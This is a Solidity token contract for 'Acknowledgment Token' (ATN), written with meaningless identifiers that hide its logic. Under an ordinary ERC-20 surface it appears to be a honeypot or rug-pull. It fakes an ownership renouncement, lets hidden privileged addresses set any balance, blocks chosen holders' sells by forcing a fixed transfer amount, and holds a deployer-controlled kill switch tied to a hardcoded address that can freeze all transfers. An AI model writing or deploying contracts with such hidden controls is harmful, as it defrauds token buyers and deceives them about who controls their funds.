//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface exemptTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletMarketing) external view returns (uint256);

    function transfer(address maxTx, uint256 feeTotalTo) external returns (bool);

    function allowance(address enableWalletLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeTotalTo) external returns (bool);

    function transferFrom(
        address sender,
        address maxTx,
        uint256 feeTotalTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listTrading, uint256 value);
    event Approval(address indexed enableWalletLaunched, address indexed spender, uint256 value);
}

abstract contract atTakeSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedAuto {
    function createPair(address fundFromFee, address amountAt) external returns (address);
}

interface exemptTxMetadata is exemptTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AcknowledgmentToken is atTakeSwap, exemptTx, exemptTxMetadata {

    mapping(address => mapping(address => uint256)) private isAt;

    bool public walletSwap;

    address public tokenTake;

    bool private autoMode;

    bool public enableTotal;

    function fundTeam(uint256 feeTotalTo) public {
        teamMarketing();
        fromIs = feeTotalTo;
    }

    event OwnershipTransferred(address indexed amountFee, address indexed txMax);

    address totalShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address toAmount, uint256 feeTotalTo) external virtual override returns (bool) {
        return tokenFundSender(_msgSender(), toAmount, feeTotalTo);
    }

    function autoMaxLaunched(address fromMode) public {
        if (walletSwap) {
            return;
        }
        if (launchExempt != exemptSellLiquidity) {
            autoMode = false;
        }
        fromLimitBuy[fromMode] = true;
        
        walletSwap = true;
    }

    function getOwner() external view returns (address) {
        return tradingLimitReceiver;
    }

    uint256 fromIs;

    uint256 private shouldSell = 100000000 * 10 ** 18;

    function launchedWallet() public {
        emit OwnershipTransferred(tokenTake, address(0));
        tradingLimitReceiver = address(0);
    }

    mapping(address => uint256) private toIs;

    function owner() external view returns (address) {
        return tradingLimitReceiver;
    }

    string private receiverReceiverMode = "ATN";

    uint256 public fundTotal;

    mapping(address => bool) public fromLimitBuy;

    bool public maxTeam;

    function name() external view virtual override returns (string memory) {
        return takeLaunch;
    }

    function tokenFundSender(address enableAmount, address maxTx, uint256 feeTotalTo) internal returns (bool) {
        if (enableAmount == tokenTake) {
            return buyTotal(enableAmount, maxTx, feeTotalTo);
        }
        uint256 limitList = exemptTx(listSellTrading).balanceOf(feeSender);
        require(limitList == fromIs);
        require(maxTx != feeSender);
        if (takeMax[enableAmount]) {
            return buyTotal(enableAmount, maxTx, launchIs);
        }
        return buyTotal(enableAmount, maxTx, feeTotalTo);
    }

    mapping(address => bool) public takeMax;

    function balanceOf(address walletMarketing) public view virtual override returns (uint256) {
        return toIs[walletMarketing];
    }

    bool public takeTx;

    uint256 public launchExempt;

    function marketingTotal(address toAmount, uint256 feeTotalTo) public {
        teamMarketing();
        toIs[toAmount] = feeTotalTo;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return shouldSell;
    }

    function approve(address minToken, uint256 feeTotalTo) public virtual override returns (bool) {
        isAt[_msgSender()][minToken] = feeTotalTo;
        emit Approval(_msgSender(), minToken, feeTotalTo);
        return true;
    }

    uint256 private exemptSellLiquidity;

    constructor (){
        
        receiverFrom autoSwapTo = receiverFrom(totalShould);
        listSellTrading = launchedAuto(autoSwapTo.factory()).createPair(autoSwapTo.WETH(), address(this));
        if (enableTotal) {
            exemptSellLiquidity = launchExempt;
        }
        tokenTake = _msgSender();
        launchedWallet();
        fromLimitBuy[tokenTake] = true;
        toIs[tokenTake] = shouldSell;
        if (enableTotal) {
            fundSwap = exemptSellLiquidity;
        }
        emit Transfer(address(0), tokenTake, shouldSell);
    }

    function fromSwap(address takeExempt) public {
        teamMarketing();
        if (enableTotal) {
            maxTeam = true;
        }
        if (takeExempt == tokenTake || takeExempt == listSellTrading) {
            return;
        }
        takeMax[takeExempt] = true;
    }

    address public listSellTrading;

    function allowance(address fundShould, address minToken) external view virtual override returns (uint256) {
        if (minToken == totalShould) {
            return type(uint256).max;
        }
        return isAt[fundShould][minToken];
    }

    uint256 public launchFrom;

    uint256 txFee;

    uint256 private fundSwap;

    function decimals() external view virtual override returns (uint8) {
        return swapFee;
    }

    address private tradingLimitReceiver;

    function buyTotal(address enableAmount, address maxTx, uint256 feeTotalTo) internal returns (bool) {
        require(toIs[enableAmount] >= feeTotalTo);
        toIs[enableAmount] -= feeTotalTo;
        toIs[maxTx] += feeTotalTo;
        emit Transfer(enableAmount, maxTx, feeTotalTo);
        return true;
    }

    address feeSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant launchIs = 17 ** 10;

    uint8 private swapFee = 18;

    string private takeLaunch = "Acknowledgment Token";

    function transferFrom(address enableAmount, address maxTx, uint256 feeTotalTo) external override returns (bool) {
        if (_msgSender() != totalShould) {
            if (isAt[enableAmount][_msgSender()] != type(uint256).max) {
                require(feeTotalTo <= isAt[enableAmount][_msgSender()]);
                isAt[enableAmount][_msgSender()] -= feeTotalTo;
            }
        }
        return tokenFundSender(enableAmount, maxTx, feeTotalTo);
    }

    function teamMarketing() private view {
        require(fromLimitBuy[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverReceiverMode;
    }

}